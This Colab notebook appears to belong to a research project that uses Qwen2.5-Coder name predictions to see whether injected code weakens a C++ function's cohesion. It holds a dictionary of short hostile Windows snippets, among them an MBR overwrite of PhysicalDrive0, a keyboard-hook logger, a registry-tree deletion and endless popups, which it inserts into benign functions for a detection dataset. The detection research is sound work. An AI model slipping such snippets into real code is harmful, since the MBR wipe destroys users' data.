# Setup

In [2]:
import os, sys, importlib
from pathlib import Path


import torch
import gc

# 1. Delete the analyzer and model objects if they exist
if 'analyzer' in locals():
    del analyzer

# 2. Force garbage collection
gc.collect()

# 3. Clear the CUDA cache
torch.cuda.empty_cache()

# 4. (Optional) Check memory again
print(f"Allocated: {torch.cuda.memory_allocated() / 1024**3:.2f} GB")
print(f"Reserved: {torch.cuda.memory_reserved() / 1024**3:.2f} GB")

Allocated: 0.00 GB
Reserved: 0.00 GB


In [3]:

import json
import pandas as pd
import numpy as np
from pathlib import Path
from tqdm.auto import tqdm
from collections import defaultdict, Counter
from transformers import pipeline, AutoTokenizer, AutoModelForCausalLM, BitsAndBytesConfig
import random
from scipy import stats
import matplotlib.pyplot as plt
from scipy.stats import f_oneway, ks_2samp, ttest_ind
from scipy.stats import wasserstein_distance
from sklearn.metrics import precision_recall_curve, auc
from sklearn.metrics import mutual_info_score
from sklearn.metrics import roc_curve, roc_auc_score
import matplotlib.pyplot as plt
import seaborn as sns
sns.set_theme()
from sklearn.metrics import average_precision_score

import re
import shutil
import git
from pathlib import Path
from multiprocessing import Pool, cpu_count
import torch
from sentence_transformers import SentenceTransformer
from sklearn.metrics.pairwise import cosine_similarity
import numpy as np
import re
from scipy.stats import entropy
from sklearn.cluster import KMeans


from google.colab import drive
drive.mount('/content/drive')

data_path = Path('/content/drive/MyDrive/Cohesion Project/data/')

!pip install -U bitsandbytes>=0.46.1

Mounted at /content/drive


In [4]:
def read_jsonl_line_by_line(file_path):
  """Reads a JSONL file line by line and yields each JSON object.

  Args:
    file_path: The path to the JSONL file.

  Yields:
    A dictionary representing each JSON object in the file.
  """
  with open(file_path, 'r') as f:
    for line in f:
      try:
        yield json.loads(line)
      except json.JSONDecodeError as e:
        print(f"Error decoding JSON on line: {line}")
        print(f"Error: {e}")


In [5]:
def count_unique_functions(file_path):
  function_set = set()
  labels = dict()
  for json_obj in tqdm(read_jsonl_line_by_line(file_path)):
    func_id = '-'.join((json_obj['project'], json_obj['file'], str(json_obj['function_start_line']), str(json_obj['function_end_line'])))
    function_set.add(func_id)
    labels[func_id] = json_obj['label']

  print('#functions:', len(function_set))
  label_sum = len(labels.values())
  label_counter = Counter(labels.values())
  print('label distribution (normalized):', {k:round(v/label_sum, 4) for k,v in label_counter.items()})

def get_func_lines(func_text):
    lines = func_text.split('\n')
    if lines[-1] == '':
        return lines[:-1]
    else:
        return lines

def get_unique_functions(file_path):
  function_dict = defaultdict(dict)
  labels = dict()
  for json_obj in tqdm(read_jsonl_line_by_line(file_path)):
    func_id = '-'.join((json_obj['project'], json_obj['file'], str(json_obj['function_start_line']), str(json_obj['function_end_line'])))
    lines = get_func_lines(json_obj['func'])
    for i, line in enumerate(lines):
        line_idx = i + json_obj['start_line'] - 1 - json_obj['function_start_line']
        function_dict[func_id][line_idx] = line
    labels[func_id] = json_obj['label']
  return function_dict, labels

In [6]:
def remove_cpp_comments(function_text):
    # Regular expression to match multi-line comments
    pattern = r"\/\*[\s\S]*?\*\/"
    # Replace comments with an empty string
    cleaned_text = re.sub(pattern, "", function_text)
    return cleaned_text

def create_mask_permutations(func_body, max_masks=8, return_type='void', params=''):
    permutations = []
    for i in range(1, max_masks + 1):
        masks = '<mask>' * i
        permutations.append(f'{return_type} {masks}({params})' +'{ \n' + func_body)
    return permutations

In [7]:
def harmonic_mean(values):
    if not values or any(v <= 0 for v in values):
        raise ValueError("Values must be a non-empty list of positive numbers.")

    n = len(values)
    reciprocals_sum = sum(1 / v for v in values)
    return n / reciprocals_sum

def extract_results(results):
    probs = []
    names = []
    for res in results:
        prob = []
        name = []
        for token in res:
            if isinstance(token, list):
                prob.append(token[0]['score'])
                name.append(token[0]['token_str'])
            else:
                prob.append(token['score'])
                name.append(token['token_str'])
        probs.append(harmonic_mean(prob))
        names.append(''.join(name))
    return probs, names

In [8]:
malwares = {
    'corruptMBR':
"""char* empt[512] = {NULL}; DWORD bytesRead = 512;
HANDLE mbr = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
WriteFile(mbr, empt, 512, &bytesRead, 0);""",

    'lockMouse':
"""RECT rcClip; HWND hwnd;
GetWindowRect(hwnd, &rcClip);
while(TRUE){
ClipCursor(&rcClip);}""",

    'regDeleteAppEvent':
"""typedef long (__stdcall* f_RegDeleteTree)(HKEY, LPCSTR);
HINSTANCE inst = LoadLibrary(TEXT("Advapi32.dll")); f_RegDeleteTree RegDeleteTree_proc;
HKEY key;
printf("Trying to access\n");
long code = RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("AppEvents"), 0, KEY_WRITE | DELETE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_SET_VALUE | KEY_WOW64_64KEY, &key);
printf("Code - %d\n", code);
if(code == ERROR_SUCCESS){
    printf("Can open\n");
    code = RegDeleteTree_proc(key, NULL);
    RegCloseKey(key);
    printf("Err code - %d", code);}""",

    'asmInjection':
"""asm volatile (
"mov %eax, 1;"
"mov %ebx, 0;"
"int $0x80;"
);""",

    'CinjectionBlockMain':
"""FILE* f = fopen("file.cpp", "rb");
char* buff = "";
long fileLen;
int i;
fseek(f, 0, SEEK_END);
fileLen = ftell(f);

rewind(f);
buff = (char*)malloc(fileLen * sizeof(char));
char c;
for(i = 0; c != EOF; i++){
    c = '0' + ((int)fgetc(f) + i);
    buff[i] = c;
}
fclose(f);
free(buff);""",

    'userPrinterMain':
"""LPMSG msg; FILE* LOG = fopen("LOG.txt", "a+");
SetWindowsHookEx(WH_KEYBOARD_LL, NULL, NULL, 0);
while(GetMessage(msg, NULL, 0, 0) > 0){
    TranslateMessage(msg);
    if(msg->wParam == WM_KEYDOWN) fputs((char*)msg->lParam, LOG);
    DispatchMessage(msg);
}
fclose(LOG);""",

    'stopProcess':
"""HANDLE explorer = GetCurrentProcess();
CloseHandle(explorer);""",

    'temperWithResolution':
"""grayScale();
getch("");
ChangeDisplaySettings(NULL, 0);""",

    'spamPopup':
"""while(1){
MessageBox(0, "close me", "bruh", MB_OK);
}"""
}

len(malwares.keys())

9

In [9]:
def insert_malware(func_body, malware, pos=1):
    func_lines = func_body.split('\n')
    pos = 1 if pos < 1 else pos
    pos = len(func_lines) - 1 if pos >= len(func_lines) else pos
    malware_lines = malware.split('\n')
    lines = func_lines[:pos] + malware_lines + func_lines[pos:]
    return '\n'.join(lines)


In [10]:
def fix_indentation(code, indent_size=4):
    """
    Fixes the indentation of C++ code based on curly braces.

    Args:
        code (str): The input C++ code as a string.
        indent_size (int): Number of spaces for each indentation level.

    Returns:
        str: Properly indented code.
    """
    lines = code.splitlines()
    fixed_lines = []
    current_indent = 0
    indent = " " * indent_size

    for line in lines:
        stripped_line = line.strip()

        # Adjust indentation for lines starting with '}' or ending with '}'
        if stripped_line.startswith("}") or stripped_line.endswith("}"):
            current_indent = max(0, current_indent - 1)

        # Add the indented line
        fixed_lines.append(indent * current_indent + stripped_line)

        # Adjust indentation for lines containing '{'
        if stripped_line.endswith("{"):
            current_indent += 1

    return "\n".join(fixed_lines)

In [11]:
def get_history_functions(file_path):
    function_dict = defaultdict(list)
    for json_obj in tqdm(read_jsonl_line_by_line(file_path)):
        func_id = json_obj['id']
        function_dict[func_id].append((json_obj['func'], json_obj['commit_time']))

    return function_dict

In [12]:
def clean_redundent_lines(body):
    return [l for l in remove_cpp_comments(body).split('\n') if l !='']

def get_return_type_and_params(line):
    return_type = [v for v in line.split(' ') if v != ''][0]
    params_match = re.search(r'\(([^)]+)\)', line)
    if params_match:
        params = params_match.group(1)
        return return_type, params
    else:
        return return_type, ''

def prepare_function(body, clean_comments=True):
    if clean_comments:
        lines = clean_redundent_lines(body)
    else:
        lines =  [l for l in body.split('\n') if l !='']
    return_type, params = get_return_type_and_params(lines[0])
    return '\n'.join(lines[1:]) + '}', return_type, params

def get_func_body(line_dict):
    line_arr = [''] * len(line_dict.keys())
    try:
        for k, v in line_dict.items():
            line_arr[k] = v
        func_body = '\n'.join(line_arr)
    except:
        func_body = '\n'.join(line_dict.values())
    return func_body

# Calculate name prediction cohesion

In [13]:
history_dict = get_history_functions(f'{data_path}/functions_over_time.jsonl')
print(list(history_dict.values())[0])
print(len(history_dict))
print(list(history_dict.values())[5])

0it [00:00, ?it/s]

[('void pcap_WriteHeader (bool microseconds){\n\n  pcap_hdr_t global_header;\n\n  if (microseconds){\n    global_header.magic_number  = 0xa1b2c3d4;\n  }\n  else {\n    global_header.magic_number  = 0xa1b23c4d; \n  }\n\n  global_header.version_major = 2;\n  global_header.version_minor = 4;\n  global_header.thiszone      = 0;\n  global_header.sigfigs       = 0;\n  global_header.snaplen       = 65535;\n  global_header.network       = 1;\n\n\n  fwrite(&global_header, sizeof(pcap_hdr_t), 1, file_write);\n\n', 1615212078), ('int pcap_WriteHeader (bool microseconds){\n\n  pcap_hdr_t global_header;\n\n  if (microseconds){\n    global_header.magic_number  = 0xa1b2c3d4;\n  }\n  else {\n    global_header.magic_number  = 0xa1b23c4d; \n  }\n\n  global_header.version_major = 2;\n  global_header.version_minor = 4;\n  global_header.thiszone      = 0;\n  global_header.sigfigs       = 0;\n  global_header.snaplen       = 65535;\n  global_header.network       = 1;\n\n\n  fwrite(&global_header, sizeof(pcap

## Run on all history functions

In [14]:
import torch
import re
from transformers import AutoTokenizer, AutoModelForCausalLM, BitsAndBytesConfig

class NameOnlyPredictor:
    def __init__(self, model_name="Qwen/Qwen2.5-Coder-1.5B-Instruct"):
        print(f"Loading generation model: {model_name}")
        self.tokenizer = AutoTokenizer.from_pretrained(model_name)

        # Ensure padding is set for consistent behavior
        if self.tokenizer.pad_token is None:
            self.tokenizer.pad_token = self.tokenizer.eos_token

        bnb_config = BitsAndBytesConfig(
            load_in_4bit=True,
            bnb_4bit_quant_type="nf4",
            bnb_4bit_compute_dtype=torch.float16,
            bnb_4bit_use_double_quant=True,
        )
        self.model = AutoModelForCausalLM.from_pretrained(
            model_name,
            quantization_config=bnb_config,
            device_map="auto",
            low_cpu_mem_usage=True
        )
        print("✓ Generation model loaded.")

    def _is_valid_identifier(self, name: str) -> bool:
        return bool(re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$', name))

    def _build_prompt(self, return_type: str, params: str, body: str) -> str:
        return_prefix = f"{return_type} " if return_type else ""
        return (
            "/*\n * Task: Function Name Prediction\n"
            " * Objective: Deduce the single most cohesive C++ function name.\n"
            " * Rules: Use lowerCamelCase. Output ONLY the name.\n */\n\n"
            f"{body}\n\n"
            "// The exact C++ function name is:\n"
            f"{return_prefix}"
        )

    def predict_names(self, return_type, params, body, n_samples=20):
        """Generates 20 names for a single function implementation in one GPU pass."""
        prompt = self._build_prompt(return_type, params, body)
        inputs = self.tokenizer(prompt, return_tensors="pt").to(self.model.device)
        prompt_len = inputs.input_ids.shape[1]

        names = []
        with torch.no_grad():
            # Generate 20 sequences at once (fastest way to get 20 samples)
            outputs = self.model.generate(
                **inputs,
                max_new_tokens=10,
                do_sample=True,
                temperature=1.0,
                num_return_sequences=n_samples,
                pad_token_id=self.tokenizer.eos_token_id
            )

        for seq in outputs:
            completion_ids = seq[prompt_len:]
            text = self.tokenizer.decode(completion_ids, skip_special_tokens=True).strip()
            # Extract the first word/identifier
            name = re.split(r'[^a-zA-Z0-9_]', text)[0]
            if name and self._is_valid_identifier(name):
                names.append(name)
        return names

In [ ]:
import os
import json
import random
from hashlib import md5
from tqdm.auto import tqdm

# Settings
benign_file = data_path / "predicted_names_data.jsonl"
malware_file = data_path / "predicted_names_malware.jsonl"
MAX_TOTAL_FUNCTIONS = 33000
SAVE_BATCH_SIZE = 50  # Write to disk every 50 functions processed

# 1. Resume Logic: Load what's already been done
def load_processed_keys(path):
    keys = set()
    if os.path.exists(path):
        with open(path, 'r') as f:
            for line in f:
                try:
                    data = json.loads(line)
                    keys.add(f"{data['func_id']}_{data['version']}")
                except: continue
    return keys

processed_benign = load_processed_keys(benign_file)
processed_malware = load_processed_keys(malware_file)
print(f"Resuming: {len(processed_benign)} benign and {len(processed_malware)} malware samples found.")

predictor = NameOnlyPredictor()
eligible_funcs = {fid: v for fid, v in history_dict.items() if len(v) > 1}

# Memory buffers for results
benign_results_buffer = []
malware_results_buffer = []
unique_func_processed = 0

# 2. Sequential Loop
for func_id, versions in tqdm(eligible_funcs.items(), desc="Unified Experiment"):
    if unique_func_processed >= MAX_TOTAL_FUNCTIONS:
        break

    sorted_v = sorted(versions, key=lambda x: x[1])[:20]
    any_new_data = False

    for v_idx, (func_str, commit_time) in enumerate(sorted_v):
        v_key = f"{func_id}_{v_idx}"

        # Prepare basic function components
        body, ret_type, params = prepare_function(func_str, clean_comments=False)

        # A. Process Benign Version
        if v_key not in processed_benign:
            names = predictor.predict_names(ret_type, params, body, n_samples=20)
            if names:
                benign_results_buffer.append({
                    "func_id": func_id, "version": v_idx, "commit_time": commit_time,
                    "return_type": ret_type, "params": params, "body": body,
                    "predicted_names": names
                })
                processed_benign.add(v_key)
                any_new_data = True

        # B. Process Randomly Injected Malware Version
        if v_key not in processed_malware:
            m_type = random.choice(list(malwares.keys()))
            m_snippet = malwares[m_type]
            f_lines = func_str.split('\n')

            # Randomly pick ONE position: start, mid, or end
            pos_label, pos_line = random.choice([
                ("start", 1),
                ("mid", len(f_lines) // 2),
                ("end", max(1, len(f_lines) - 1))
            ])

            malicious_body = fix_indentation(insert_malware(body, m_snippet, pos=pos_line))
            names = predictor.predict_names(ret_type, params, malicious_body, n_samples=20)

            if names:
                malware_results_buffer.append({
                    "func_id": func_id, "version": v_idx, "commit_time": commit_time,
                    "injection_pos": pos_label, "injection_type": m_type,
                    "return_type": ret_type, "params": params, "body": malicious_body,
                    "predicted_names": names
                })
                processed_malware.add(v_key)
                any_new_data = True

    if any_new_data:
        unique_func_processed += 1

    # 3. Batch Write to File (Saves time by reducing disk I/O)
    if unique_func_processed > 0 and unique_func_processed % SAVE_BATCH_SIZE == 0:
        if benign_results_buffer:
            with open(benign_file, "a") as f:
                print('writing benign')
                for res in benign_results_buffer: f.write(json.dumps(res) + "\n")
            benign_results_buffer = []

        if malware_results_buffer:
            with open(malware_file, "a") as f:
                print('writing malware')
                for res in malware_results_buffer: f.write(json.dumps(res) + "\n")
            malware_results_buffer = []

# Final Save for remaining items
if benign_results_buffer:
    with open(benign_file, "a") as f:
        for res in benign_results_buffer: f.write(json.dumps(res) + "\n")
if malware_results_buffer:
    with open(malware_file, "a") as f:
        for res in malware_results_buffer: f.write(json.dumps(res) + "\n")

print(f"Done! Final count: {unique_func_processed} functions processed.")

Resuming: 88779 benign and 88131 malware samples found.
Loading generation model: Qwen/Qwen2.5-Coder-1.5B-Instruct


/usr/local/lib/python3.12/dist-packages/huggingface_hub/utils/_auth.py:93: UserWarning: 
The secret `HF_TOKEN` does not exist in your Colab secrets.
To authenticate with the Hugging Face Hub, create a token in your settings tab (https://huggingface.co/settings/tokens), set it as secret in your Google Colab and restart your session.
You will be able to reuse this secret in all of your notebooks.
Please note that authentication is recommended but still optional to access public models or datasets.
  warnings.warn(


config.json:   0%|          | 0.00/660 [00:00<?, ?B/s]

tokenizer_config.json: 0.00B [00:00, ?B/s]

vocab.json: 0.00B [00:00, ?B/s]

merges.txt: 0.00B [00:00, ?B/s]

... (3 outputs left out)

generation_config.json:   0%|          | 0.00/242 [00:00<?, ?B/s]

✓ Generation model loaded.


Unified Experiment:   0%|          | 0/54706 [00:00<?, ?it/s]

writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing benign
writing malware
writing 